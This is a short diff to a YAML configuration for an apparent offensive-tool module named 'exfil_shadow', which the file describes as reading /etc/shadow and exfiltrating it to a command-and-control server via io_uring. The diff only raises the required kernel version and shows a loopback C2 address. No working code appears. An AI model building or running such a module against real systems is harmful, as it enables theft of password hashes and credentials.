@@ -1,6 +1,6 @@
 name: exfil_shadow
 description: Read /etc/shadow (full file, chunked until EOF) and exfiltrate to C2 via io_uring
-requires_kernel: "5.6"
+requires_kernel: "5.19"
 
 config:
   c2_ip:   "127.0.0.1"
